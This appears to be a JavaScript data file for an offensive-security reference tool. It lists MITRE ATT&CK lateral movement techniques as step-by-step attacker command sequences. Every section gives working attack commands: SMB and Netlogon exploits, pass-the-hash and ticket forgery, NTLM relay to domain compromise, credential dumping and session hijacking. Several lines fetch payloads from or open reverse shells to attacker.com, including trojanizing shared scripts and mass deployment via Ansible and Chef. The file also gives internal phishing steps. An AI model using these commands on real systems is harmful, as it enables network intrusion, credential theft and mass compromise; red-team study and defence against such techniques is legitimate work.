export const LATERAL_MOVEMENT = {
  id: "lateral-movement",
  name: "Lateral Movement",
  tacticId: "TA0008",
  subtitle: "Pass-the-Hash • PtT • Overpass-the-Hash • Pass-the-Cert • Web Session Cookie Reuse • Azure PRT • PTH Local Admin • Internal CVE Exploit • Remote Exec • RDP • SSH • WinRM • DCOM • VNC • Cloud Services • NTLM Relay Pivot • Forest Pivot • Lateral Tool Transfer • Software Deployment • Taint Shared Content",
  color: "#c084fc",
  techniques: [
    {
      name: "Exploitation of Remote Services",
      id: "T1210",
      summary: "EternalBlue • MS17-010 • SMB exploits • internal CVEs",
      description: "Exploit internal network service vulnerabilities for lateral movement",
      tags: ["EternalBlue", "MS17-010", "SMB RCE", "T1210"],
      steps: [
        "MS17-010 EternalBlue (SMB RCE):\n$ nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24\n# Find vulnerable hosts first\n$ python3 eternalblue.py 192.168.1.100\n# Or via Metasploit:\n$ msfconsole\n> use exploit/windows/smb/ms17_010_eternalblue\n> set RHOSTS 192.168.1.100\n> set PAYLOAD windows/x64/meterpreter/reverse_tcp\n> exploit",
        "BlueKeep (RDP CVE-2019-0708):\n$ nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.0/24\n$ python3 rdpscan.py -p 3389 192.168.1.100\n# Metasploit module (unreliable):\n> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n> set RHOSTS 192.168.1.100\n# BlueKeep patches available since 2019 - rare on patched systems",
        "Internal web application exploits:\n$ nmap -sV -sC 192.168.1.0/24 -p 80,443,8080,8443\n# After discovering internal apps:\n$ nikto -h http://192.168.1.50:8080\n$ sqlmap -u 'http://192.168.1.50:8080/search?q=1' --level 5 --risk 3\n# Internal apps often less hardened than external",
        "ZeroLogon (Netlogon CVE-2020-1472):\n$ python3 cve-2020-1472-exploit.py DC_NAME DC_IP\n# Sets DC machine account password to empty\n$ secretsdump.py -no-pass -just-dc domain/DC_NAME$@DC_IP\n# Dump all domain hashes - domain compromise in seconds",
        "PrintNightmare internal exploitation:\n$ nmap -p 445 --script smb-enum-shares 192.168.1.0/24\n# Find spooler service enabled:\n$ rpcdump.py @192.168.1.100 | grep 'IRemoteWinspool'\n$ python3 CVE-2021-1675.py domain/user:pass@192.168.1.100 '\\\\attacker\\share\\payload.dll'"
      ]
    },
    {
      name: "Use Alternate Authentication Material",
      id: "T1550",
      summary: "Pass-the-Hash • Pass-the-Ticket • Overpass-the-Hash • Pass-the-Cert",
      description: "Authenticate using stolen hashes, tickets, and certificates without knowing the plaintext password",
      tags: ["PtH", "PtT", "Overpass-the-Hash", "T1550"],
      steps: [
        "Pass-the-Hash (PTH) — authenticate with NT hash, no plaintext password needed:\n# NT hash is the credential Windows uses for NTLM authentication\n# Extract from: LSASS dump, SAM database, NTDS.dit DCSync, secretsdump\n$ nxc smb 192.168.1.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH\n# Left side of colon: LM hash (can be 'aad3b435...' placeholder); right: NT hash\n$ psexec.py -hashes :NTLM_HASH domain/administrator@192.168.1.100\n# psexec: uploads service binary, creates service, executes, removes — EVENT ID 7045 generated\n$ evil-winrm -i 192.168.1.100 -u administrator -H NTLM_HASH\n# evil-winrm: WinRM (port 5985/5986) — quieter than psexec, no service creation\n# Restriction: local admin hashes blocked from network auth by default (KB2871997) — domain accounts work",
        "Pass-the-Ticket (PtT) — use stolen Kerberos TGT/TGS directly:\n# Kerberos tickets are portable credential objects — steal from LSASS and reuse\n# From Linux: obtain TGT with valid creds/hash, export to ccache file\n$ getTGT.py domain/admin:pass -dc-ip DC_IP\n$ export KRB5CCNAME=admin.ccache\n$ psexec.py -k -no-pass domain/admin@target.domain.com\n# -k: use Kerberos from KRB5CCNAME; -no-pass: don't prompt for password\n# From Windows: steal TGT from LSASS memory (requires admin)\n$ Rubeus.exe dump /service:krbtgt /nowrap\n$ Rubeus.exe ptt /ticket:BASE64_TGT\n# PtT is stealthier than PtH: uses Kerberos (port 88) not NTLM, fewer logs",
        "Overpass-the-Hash (NT hash → Kerberos TGT):\n# Many orgs block NTLM laterally but allow Kerberos — convert hash to TGT\n# Useful after dumping hashes but finding NTLM blocked at network level\n$ getTGT.py domain/user -hashes :NT_HASH -dc-ip DC_IP\n$ export KRB5CCNAME=user.ccache\n# Now use Kerberos tools: -k flag with psexec.py, wmiexec.py, smbclient.py\n$ wmiexec.py -k -no-pass domain/user@target.domain.com\n# Windows: Mimikatz converts hash to TGT in-memory\n$ sekurlsa::pth /user:admin /domain:domain.com /ntlm:NTLM_HASH /run:powershell.exe\n# A new PowerShell session opens with a valid Kerberos TGT injected",
        "Pass-the-Certificate (PtCert) — PKINIT auth with stolen/forged cert:\n# Certificates authenticate independently of passwords — password change doesn't invalidate them\n# Steal cert from user's certificate store, or forge via ADCS ESC1/stolen CA key\n$ certipy auth -pfx stolen_user.pfx -dc-ip DC_IP -domain domain.com\n# Returns BOTH a TGT AND the user's NT hash (UnPAC-the-Hash)\n# NT hash without knowing the plaintext password = full account access\n$ python3 gettgtpkinit.py -cert-pfx user.pfx -pfx-pass PASSWORD domain.com/user@DC_IP\n# Best persistence: certs can have 1-10 year validity, survive multiple password resets",
        "Pass-the-Key (AES Kerberos — stealthiest option):\n# AES-encrypted Kerberos tickets generate less EDR telemetry than RC4/NTLM\n# AES keys extracted alongside NT hashes from LSASS\n$ Invoke-Mimikatz -Command '\"sekurlsa::ekeys\"'  # Extract AES256/AES128 keys\n$ getTGT.py domain/user -aesKey AES256_KEY -dc-ip DC_IP\n$ export KRB5CCNAME=user.ccache\n# AES tickets: no RC4 downgrade alerts, mimics legitimate Windows Kerberos behavior\n# Detection: Kerberos etype 17/18 (AES) in tickets — expected; etype 23 (RC4) = suspicious on modern DCs"
      ]
    },
    {
      name: "Remote Service Session Hijacking",
      id: "T1563",
      summary: "RDP session hijack • SSH hijack • tscon • tmux hijack",
      description: "Hijack existing user sessions to access resources without authentication",
      tags: ["RDP hijack", "SSH hijack", "tscon", "T1563"],
      steps: [
        "RDP session hijacking (Windows, requires SYSTEM):\n$ query session  # List all sessions\n# or:\n$ qwinsta\n# Hijack disconnected session:\n$ tscon <SESSION_ID> /dest:console\n# No password needed - takes over disconnected session\n# Requires SYSTEM privileges",
        "RDP session hijack via service:\n$ sc create rdphijack binPath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#0\" start= demand\n$ sc start rdphijack\n# Create service running as SYSTEM that calls tscon",
        "SSH hijack via agent forwarding abuse:\n$ ps aux | grep ssh\n$ ls -la /tmp/ssh-*/\n# Find agent socket files\n$ export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXX\n$ ssh -A user@target  # Hijacks SSH agent\n# Requires access to agent socket file (often world-readable)",
        "tmux/screen session hijacking:\n$ tmux list-sessions\n$ tmux attach -t target_session\n# If tmux socket is writable, can attach to another user's session\n# screen: screen -r <pid.tty.host>",
        "X11 session hijacking:\n$ xdpyinfo -display :0  # Check display 0\n$ xhost  # Check X11 access control\n# If X11 is open:\n$ DISPLAY=:0 xterm\n$ DISPLAY=:0 xwd -root -out screenshot.xwd\n# Take screenshot or spawn terminal in user's X session"
      ]
    },
    {
      name: "Internal Spearphishing",
      id: "T1534",
      summary: "Compromised mailbox • IM pivot • trusted sender • Teams phish",
      description: "Send phishing messages from a compromised internal account to move laterally",
      tags: ["internal phish", "compromised mailbox", "Teams", "T1534"],
      steps: [
        "Send spearphish from compromised mailbox:\n# Access compromised user's mailbox via OWA or Outlook\n# Look at their sent emails to understand writing style\n# Create and send email via Outlook on the web or Mail app\n$ python3 roadx.py -u victim@target.com -p pass --send-email ceo@target.com --subject 'Updated Policy' --body 'See attached' --attach payload.docx\n# Or use Graph API if app registration is available",
        "Microsoft Teams phishing:\n# If you have compromised O365 account with Teams access:\n# Login via Teams client and send DM/message in channel\n$ teams-cli send-message --username victim@target.com --password pass --recipient colleague@target.com --message 'Please review attached document'\n# Internal Teams messages have high trust\n# Or use Graph API to send messages programmatically",
        "Slack phishing:\n# Login to compromised Slack account\n# DM target users with malicious file or link\n# Slack workspace phishing remains effective due to high trust\n$ slackhound.py --token xoxs-TOKEN --message 'Meeting link: https://attacker.com/meet' --channel general",
        "SharePoint/OneDrive malicious file sharing:\n# Share malicious Office document from compromised account\n# Send sharing notification email to targets\n# File hosted on legitimate SharePoint - URL is trusted\n# Document loads remote template from attacker",
        "Email reply hijacking:\n# Find existing email threads in compromised mailbox\n# Reply to thread with malicious attachment\n# Context of existing conversation increases trust\n# Target expects document related to ongoing discussion"
      ]
    },
    {
      name: "Lateral Tool Transfer",
      id: "T1570",
      summary: "SMB • Impacket • SCP • netcat • BITS transfer • Cobalt Strike",
      description: "Transfer attack tools and payloads between compromised systems",
      tags: ["SMB transfer", "SCP", "netcat", "BITS", "T1570"],
      steps: [
        "SMB file transfer:\n$ copy payload.exe \\\\192.168.1.100\\c$\\Windows\\Temp\\\n$ python3 smbclient.py domain/admin:pass@192.168.1.100\n: cd C\\Windows\\Temp\n: put payload.exe\n# Copy tool to remote host's accessible share",
        "SCP / SSH transfer:\n$ scp payload.sh user@192.168.1.100:/tmp/\n$ rsync -avz tools/ user@192.168.1.100:/tmp/tools/\n# Requires SSH access to target",
        "netcat file transfer:\n# Receiver:\n$ nc -lp 4444 > payload.exe\n# Sender:\n$ nc 192.168.1.100 4444 < payload.exe\n# Or with /dev/tcp:\n$ cat payload.exe > /dev/tcp/192.168.1.100/4444",
        "PowerShell download from web:\n> Invoke-WebRequest -Uri 'http://attacker.com/tool.exe' -OutFile 'C:\\Windows\\Temp\\tool.exe'\n> (New-Object Net.WebClient).DownloadFile('http://attacker.com/tool.exe', 'C:\\Temp\\tool.exe')\n> certutil -urlcache -split -f http://attacker.com/tool.exe C:\\Temp\\tool.exe\n# Multiple methods for download",
        "BITS download (stealthy):\n$ bitsadmin /transfer 'Update' http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe\n# BITS traffic looks like Windows Update\n# Survives reboots, handles interrupted transfers"
      ]
    },
    {
      name: "Remote Services - SSH, RDP, VNC",
      id: "T1021",
      summary: "RDP • SSH • VNC • WinRM • DCOM • SMB exec",
      description: "Use legitimate remote access services to move laterally",
      tags: ["RDP", "SSH", "WinRM", "DCOM", "T1021"],
      steps: [
        "RDP lateral movement:\n$ xfreerdp /v:192.168.1.100 /u:administrator /p:Password1 /d:DOMAIN /cert-ignore\n$ xfreerdp /v:192.168.1.100 /u:administrator /pth:NTLM_HASH\n# Restricted Admin mode for PtH with RDP",
        "WinRM / PowerShell remoting:\n$ evil-winrm -i 192.168.1.100 -u administrator -p Password1\n> Enter-PSSession -ComputerName 192.168.1.100 -Credential domain\\admin\n> Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock { whoami } -Credential $cred",
        "SSH lateral movement:\n$ ssh user@192.168.1.100\n$ ssh -i stolen_key.pem ubuntu@192.168.1.100\n# ProxyJump for pivot:\n$ ssh -J pivot_host target_host\n$ ssh -L 3389:192.168.2.100:3389 user@pivot_host\n# Forward RDP through SSH tunnel",
        "DCOM lateral movement:\n$ dcomexec.py -object MMC20 domain/admin:pass@192.168.1.100 'cmd.exe /c whoami > C:\\\\out.txt'\n# Objects: MMC20, ShellWindows, ShellBrowserWindow, ExcelDDE\n# Less monitored than PsExec",
        "SMBExec lateral movement:\n$ smbexec.py domain/admin:pass@192.168.1.100\n# No binary transfer - creates service per command\n# Cleaner than PsExec in some environments\n$ wmiexec.py domain/admin:pass@192.168.1.100 'whoami'"
      ]
    },
    {
      name: "Taint Shared Content",
      id: "T1080",
      summary: "Shared folder • SCF files • LNK in share • trojanize scripts",
      description: "Poison shared network resources to capture credentials or gain code execution",
      tags: ["SCF file", "LNK in share", "trojanize", "T1080"],
      steps: [
        "SCF file in network share for credential capture:\n> [Shell]\n> Command=2\n> IconFile=\\\\attacker.com\\share\\test.ico\n> [Taskbar]\n> Command=ToggleDesktop\n# Save as @anything.scf in writable network share\n# Windows auto-requests icon via UNC → Responder captures hash",
        "Malicious LNK file in shared drive:\n> $lnk = (New-Object -Com WScript.Shell).CreateShortcut('Shared Report.lnk')\n> $lnk.TargetPath = 'cmd.exe'\n> $lnk.Arguments = '/c powershell -enc BASE64'\n> $lnk.IconLocation = 'C:\\Windows\\System32\\shell32.dll,153'  # Looks like PDF\n> $lnk.Save()\n$ copy 'Shared Report.lnk' \\\\server\\shares\\Finance\\\n# Anyone opening the folder executes the LNK",
        "Trojanize script in shared folder:\n$ cat /mnt/share/run_report.sh\n# Add to beginning of existing script:\n> bash -i >& /dev/tcp/attacker.com/4444 0>&1 &\n# Original script still runs - users don't notice\n# Executes when any user runs the shared script",
        "Trojanize Office template in shared location:\n# Find shared Office templates (.dotm, .xltm)\n# Add malicious macro to template\n# All users opening documents based on this template execute macro",
        "Poison Python/Ruby/Node scripts in shared repos:\n# Add import of malicious module at top of shared scripts\n# Or modify requirements.txt to include malicious package\n# Next developer running the script installs and executes malware"
      ]
    },
    {
      name: "NTLM Relay Pivot",
      id: "T1557.relay",
      summary: "SMB → LDAP → HTTP → AD CS • ntlmrelayx • multi-relay pivot",
      description: "Chain NTLM relay attacks across protocols to escalate from captured hash to domain compromise",
      tags: ["ntlmrelayx", "NTLM relay", "SMB relay", "LDAP relay", "T1557"],
      steps: [
        "NTLM Relay chain — setup and mechanics:\n# NTLM relay = capture auth from one machine, forward to another, get authenticated session\n# Key requirement: SMB signing MUST be disabled on relay TARGET\n# Step 1: Find targets without SMB signing:\n$ nmap -p 445 192.168.1.0/24 --script smb-security-mode | grep 'message_signing: disabled' -B5 | grep 'Nmap scan' | awk '{print $5}' > nosigning_targets.txt\n# Step 2: Disable Responder's SMB+HTTP so they don't capture (we relay instead):\n$ sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\n# Step 3: Start Responder (captures NTLM challenges) + ntlmrelayx (relays them):\n$ responder -I eth0 -wrd &  # Poison LLMNR/NBT-NS → victims send us NTLM auth\n$ ntlmrelayx.py -tf nosigning_targets.txt -smb2support -c 'whoami > C:\\\\Windows\\\\Temp\\\\out.txt'",
        "SMB → LDAP relay (RBCD — most impactful pivot):\n# Relay machine account auth (triggered by Responder or coercion) to LDAP\n# Sets up RBCD: attacker machine can impersonate ANY user on target\n$ ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support\n# After relay: a machine account is created with RBCD write on target\n# Get S4U2Self ticket:\n$ getST.py -spn host/TARGET.domain.com -impersonate administrator -dc-ip DC_IP domain.com/ATTACKPC$:Pass\n$ export KRB5CCNAME=administrator.ccache\n$ secretsdump.py -k -no-pass TARGET.domain.com  # Dump as administrator",
        "SMB → LDAPS relay (shadow credentials on DC$ — DCSync path):\n# Relay DC machine account auth to LDAPS\n# LDAPS required for shadow credentials (LDAP unsigned operations blocked)\n$ ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target 'DC01$' -smb2support\n# Trigger DC authentication via coercion:\n$ python3 Coercer.py coerce -u user -p pass -d domain.com -l ATTACKER_IP -t DC_IP\n# After relay: shadow credential added to DC01$ → get TGT as DC$\n$ certipy auth -pfx DC01.pfx -dc-ip DC_IP  # Returns TGT + NT hash for DC$\n$ secretsdump.py -hashes :DC_NTLM_HASH domain/DC01$@DC_IP  # Full DCSync",
        "SMB → ADCS HTTP relay (ESC8 — certificate for DC$):\n# Most reliable path to domain compromise via relay\n# Requires: ADCS with HTTP enrollment endpoint (no HTTPS enforcement)\n$ ntlmrelayx.py -t http://ADCS_SERVER/certsrv/certfnsh.asp --adcs --template DomainController -smb2support\n# Coerce DC authentication:\n$ python3 PetitPotam.py -u user -p pass ATTACKER_IP DC_IP\n# Relay issues a DomainController template cert signed as DC$\n$ certipy auth -pfx dc01.pfx -dc-ip DC_IP\n# PKINIT TGT → UnPAC NT hash → DCSync all domain hashes",
        "IPv6 MITM relay with mitm6 (no coercion, no LLMNR needed):\n# mitm6 advertises itself as IPv6 DNS server via DHCPv6 — Windows prefers IPv6 DNS\n# All machines on segment automatically use attacker as DNS → WPAD auth → NTLM relay\n$ mitm6 -d domain.com &\n$ ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -wh fakewpad.domain.com -smb2support\n# Very passive: no coercion needed, works continuously as machines get DHCP leases\n# Effective even on networks with LLMNR/NBNS disabled\n# Targets authenticate to fakewpad.domain.com (fake WPAD proxy) → relay to LDAP"
      ]
    },
    {
      name: "Forest Pivot",
      id: "T1550.forest",
      summary: "SID History • foreign groups • cross-forest TGT • trust ticket",
      description: "Move laterally across Active Directory forest trust boundaries using SID history injection and foreign group memberships",
      tags: ["SID History", "foreign groups", "trust ticket", "cross-forest", "T1550"],
      steps: [
        "Enumerate cross-forest group memberships:\n$ Get-ADUser -Filter * -Properties SIDHistory,MemberOf | Where {$_.MemberOf -match 'Foreign'}\n$ Get-ADForeignSecurityPrincipal -Filter * | Select DistinguishedName,ObjectSid\n# Foreign security principals = accounts from other domains/forests with local group membership\n# If attacker controls account with foreign membership: pivot to that forest",
        "SID History injection for cross-domain access:\n$ Get-ADUser targetuser -Properties SIDHistory\n# If account has SID history containing a privileged SID from another domain:\n# Authentication in that domain will include the historical SID\n# Grants privileges associated with that SID in the historical domain",
        "Inject SID History with Mimikatz (requires DA):\n$ mimikatz.exe 'privilege::debug' 'misc::addsid targetuser S-1-5-21-FOREST-SID-512'\n# Adds Domain Admins SID from another domain into SID history\n# Requires: DA + SID filtering disabled on trust\n# User now has DA privileges in the other forest/domain",
        "Cross-forest authentication with trust key:\n$ ticketer.py -nthash TRUST_KEY -domain-sid SOURCE_SID -domain source.domain.com -spn krbtgt/target.forest.com Administrator\n$ export KRB5CCNAME=Administrator.ccache\n$ getST.py -k -no-pass -spn cifs/TARGET_DC.target.forest.com target.forest.com/Administrator\n# Forge inter-forest referral TGT using trust key",
        "Enumerate foreign group memberships via LDAP:\n$ ldapsearch -x -H ldap://DC_IP -b 'CN=ForeignSecurityPrincipals,DC=domain,DC=com' '(objectClass=foreignSecurityPrincipal)'\n$ Get-ADGroup -Filter * | ForEach { Get-ADGroupMember $_ | Where {$_.objectClass -eq 'foreignSecurityPrincipal'} } | Select Name\n# Identify groups containing accounts from trusted domains/forests\n# These are cross-forest pivot points"
      ]
    },
    {
      name: "Remote Services - VNC",
      id: "T1021.005",
      summary: "VNC • TigerVNC • RealVNC • UltraVNC • password brute",
      description: "Use VNC remote desktop services for lateral movement and interactive access",
      tags: ["VNC", "TigerVNC", "remote desktop", "T1021"],
      steps: [
        "Scan for VNC services:\n$ nmap -p 5900-5910 192.168.1.0/24 -sV\n$ nxc vnc 192.168.1.0/24 -p 5900\n# VNC default port: 5900 (+display number)",
        "VNC password brute force:\n$ hydra -P passwords.txt -t 4 vnc://192.168.1.100\n$ medusa -h 192.168.1.100 -P passwords.txt -M vnc -n 5900\n# VNC passwords are often short (max 8 chars on some implementations)",
        "VNC authentication bypass (CVE-2006-2369):\n$ python3 vnc_auth_bypass.py 192.168.1.100\n# Some VNC servers have NULL authentication bypass\n# Type 1 authentication = no auth required",
        "Connect to VNC with known password:\n$ vncviewer -passwd vnc_pass_file 192.168.1.100:5900\n$ xtightvncviewer 192.168.1.100:5900\n# Interactive desktop access without user consent",
        "Install VNC on compromised host (persistence):\n$ sc create vncsvc binpath='C:\\Windows\\Temp\\vnc.exe -service' start=auto\n$ /tmp/Xvnc :1 -SecurityTypes None -localhost no &\n# Set up VNC for persistent access"
      ]
    },
    {
      name: "Remote Services - Cloud Services",
      id: "T1021.007",
      summary: "AWS SSM Session Manager • Azure Bastion • GCP IAP • cloud shell lateral",
      description: "Use cloud provider remote access services for lateral movement between cloud resources",
      tags: ["AWS SSM", "Azure Bastion", "GCP IAP", "T1021"],
      steps: [
        "AWS SSM Session Manager lateral movement:\n$ aws ssm start-session --target i-INSTANCE_ID\n# Opens interactive shell to EC2 instance\n# No inbound ports required - works through SSM agent\n# Uses compromised IAM credentials",
        "AWS EC2 Instance Connect:\n$ aws ec2-instance-connect send-ssh-public-key --instance-id i-ID --instance-os-user ec2-user --ssh-public-key file://attacker.pub\n$ ssh -i attacker.pem ec2-user@INSTANCE_IP\n# Temporarily push SSH key to instance metadata\n# Only valid for 60 seconds - then SSH in",
        "Azure Bastion for lateral movement:\n# Azure Bastion provides RDP/SSH without public IP\n$ az network bastion ssh --name bastion --resource-group RG --target-ip-address TARGET_IP --auth-type password --username user\n# Requires AzureBastion reader role on target",
        "GCP Identity-Aware Proxy (IAP) tunneling:\n$ gcloud compute ssh instance-name --zone ZONE --tunnel-through-iap\n# IAP proxies SSH through Google's network\n# Useful for instances without public IP\n$ gcloud compute start-iap-tunnel INSTANCE_NAME 22 --local-host-port=localhost:2222",
        "Cloud-to-cloud lateral movement:\n$ aws sts assume-role --role-arn arn:aws:iam::ANOTHER_ACCOUNT:role/CrossAccount --role-session-name lateral\n# Move from one AWS account to another via cross-account role\n# Multi-account AWS environments common in enterprises"
      ]
    },
    {
      name: "Exploitation of Remote Services - Internal",
      id: "T1210.internal",
      summary: "Internal CVEs • unpatched internal services • EternalBlue internal • Spring4Shell internal",
      description: "Exploit vulnerabilities in internal network services after gaining initial foothold",
      tags: ["internal CVE", "internal exploit", "T1210"],
      steps: [
        "Internal vulnerability scan after foothold:\n$ nmap -sV --script=vuln 192.168.1.0/24 -p 80,443,445,3389,8080,8443 --open -oA internal_vuln\n$ nxc smb 192.168.1.0/24 -u user -p pass --gen-relay-list nosigning.txt\n# Scan internal network for known vulnerable services\n# Focus: unpatched web apps, default creds, SMB without signing",
        "Internal Spring4Shell (CVE-2022-22965):\n$ python3 spring4shell.py --url http://192.168.1.50:8080/app/path\n# Spring Framework RCE via data binding\n# Common in internal Java applications\n# Uploads webshell to server via class loader manipulation",
        "Apache Log4Shell on internal systems:\n$ cat internal_java_hosts.txt | while read host; do\n  curl -sk -H \"X-Api-Version: \\${jndi:ldap://attacker.com:1389/a}\" http://$host/\ndone\n# Probe all internal Java services for Log4j\n# Internal systems often unpatched long after CVE publication",
        "Internal Exchange ProxyShell:\n$ python3 proxyshell.py -u https://mail.internal.local -e admin@target.com\n# ProxyShell: pre-auth RCE on Exchange\n# Internal Exchange servers often behind perimeter but exploitable internally",
        "SQLi on internal web apps:\n$ sqlmap -u 'http://192.168.1.100/intranet/search?q=1' --dbs --batch --level=3 --risk=3\n# Internal apps rarely hardened as well as external-facing\n# SA/root-level DB access common on internal SQL servers\n$ sqlmap -u 'http://192.168.1.100/' --os-shell --dbms=mssql\n# MSSQL xp_cmdshell → SYSTEM on database server"
      ]
    },
    {
      name: "Pass the Hash - Local Admin",
      id: "T1550.PtH",
      summary: "Local admin PTH • SAM dump • NTLM auth • CrackMapExec spray",
      description: "Use NTLM hashes of local administrator accounts to authenticate across machines with the same password",
      tags: ["Pass the Hash", "local admin", "SAM", "NTLM", "T1550"],
      steps: [
        "Dump local SAM hashes from compromised machine:\n$ secretsdump.py domain/admin:pass@192.168.1.100 -sam\n# Or from local registry hives:\n$ reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM sys.hiv\n$ secretsdump.py -sam sam.hiv -system sys.hiv LOCAL\n# Extract local Administrator NTLM hash",
        "Spray local admin hash across network:\n$ nxc smb 192.168.1.0/24 -u administrator -H LOCAL_ADMIN_NTLM --local-auth --continue-on-success\n# --local-auth: authenticate as local account (not domain)\n# If password is reused: get shell on every matching host\n$ nxc smb 192.168.1.0/24 -u administrator -H HASH --local-auth -x 'whoami' --continue-on-success",
        "Dump additional credentials from matched hosts:\n$ nxc smb 192.168.1.0/24 -u administrator -H HASH --local-auth --sam --continue-on-success\n$ nxc smb 192.168.1.0/24 -u administrator -H HASH --local-auth --lsa --continue-on-success\n# Dump SAM and LSA secrets from every matched host\n# May reveal domain service account credentials",
        "Identify hosts where hash works:\n$ nxc smb 192.168.1.0/24 -u administrator -H HASH --local-auth | grep -v 'ACCESS_DENIED\\|STATUS_LOGON_FAILURE'\n# Focus on PWNED: responses - pivot from these hosts\n# Check for interesting processes/sessions on matched hosts",
        "LAPS bypass — read managed passwords:\n$ nxc ldap DC_IP -u user -p pass -M laps\n$ python3 pyLAPS.py --action get -u user -p pass -d domain.com\n# LAPS sets unique local admin password per machine\n# If readable by current user: get unique hash per machine\n# Replaces spray approach for LAPS-managed environments"
      ]
    },
    {
      name: "Use Alternate Authentication - Web Session Cookies",
      id: "T1550.004",
      summary: "Cookie hijack • stolen session tokens • browser cookie import • O365 token reuse",
      description: "Use stolen web session cookies and tokens to authenticate to web applications without credentials",
      tags: ["cookie hijack", "session token", "O365 cookie", "T1550"],
      steps: [
        "Import stolen O365/Azure session cookies:\n# Extract cookies with SharpChrome or HackBrowserData\n# Import into browser via EditThisCookie or DevTools:\n# Application → Cookies → right-click → Import\n# Or use curl:\n$ curl -H 'Cookie: .ASPXAUTH=STOLEN; esctx=STOLEN; stsservicecookie=estsfd' https://outlook.office365.com/mail/inbox",
        "Roadtx cookie-based token extraction:\n$ python3 roadtx.py describe -t STOLEN_ACCESS_TOKEN\n$ python3 roadtx.py -t STOLEN_TOKEN listusers\n# Use stolen Bearer token with roadtx for M365 enumeration\n# Access: mail, Teams, SharePoint, OneDrive with stolen token",
        "AWS credential cookie/token reuse:\n$ aws configure set aws_access_key_id STOLEN_AKID\n$ aws configure set aws_secret_access_key STOLEN_SAK\n$ aws configure set aws_session_token STOLEN_SESSION_TOKEN\n$ aws sts get-caller-identity  # Validate\n$ aws s3 ls  # Access resources\n# Temporary credentials include session token (valid hours)",
        "Evilginx captured session replay:\n# Sessions captured by Evilginx in /root/.evilginx/phishlets/\n# Extract: username, session token, refresh token\n$ cat /root/.evilginx/phishlets/microsoft/sessions.json\n# Import session cookies into browser\n# Bypasses MFA: session already post-MFA",
        "Azure PRT (Primary Refresh Token) theft:\n$ python3 roadtx.py prt --username user@tenant.com --refresh-token STOLEN_REFRESH\n# PRT: long-lived token on Azure AD-joined devices\n# Theft via lsass dump (AAD Broker plugin) or Mimikatz:\n$ dpapi::cloudapkd /keyvalue:DPAPI_KEY /unprotect\n# PRT → mint access tokens for any Azure resource without re-auth"
      ]
    },
    {
      name: "Software Deployment Tools - Lateral",
      id: "T1072.lateral",
      summary: "SCCM exec • Ansible • Puppet • PDQ • Kaseya • RMM tools",
      description: "Abuse software deployment and management tools to execute payloads across the environment",
      tags: ["SCCM", "Ansible", "PDQ", "RMM", "T1072"],
      steps: [
        "SCCM application deployment:\n# With SCCM admin access:\n# Create Application → Add Deployment Type → Script Installer\n# Script: powershell -enc BASE64\n# Deploy to collection → All Systems\n# All SCCM-managed systems execute payload as SYSTEM",
        "Ansible mass execution:\n$ ansible all -i inventory.ini -m shell -a 'curl http://attacker.com/shell.sh | bash' --become\n$ ansible all -m copy -a 'src=payload.py dest=/tmp/update.py' -i inventory.ini\n$ ansible all -m command -a '/tmp/update.py' -i inventory.ini\n# Single command = code execution on ALL managed hosts",
        "PDQ Deploy (Windows):\n# Admin console: New Package → Add Step → Install\n# Command: powershell.exe -enc BASE64\n# Targets: Deploy to All Computers\n# Executes as SYSTEM on all PDQ-managed systems",
        "ConnectWise Automate / RMM abuse:\n# Remote Monitor & Management tools used by MSPs\n# If compromised: deploy to all MSP clients\n# Scripts run as SYSTEM on every managed endpoint\n# Kaseya VSA (CVE-2021-30116): deploy to 1500+ MSP clients",
        "Chef/Puppet code push:\n$ knife ssh 'name:*' -x root -i ~/.ssh/id_rsa 'curl http://attacker.com/sh | bash'\n# knife ssh: run command on all Chef nodes\n# Puppet: push malicious manifest, applied on next agent run"
      ]
    }
  ]
};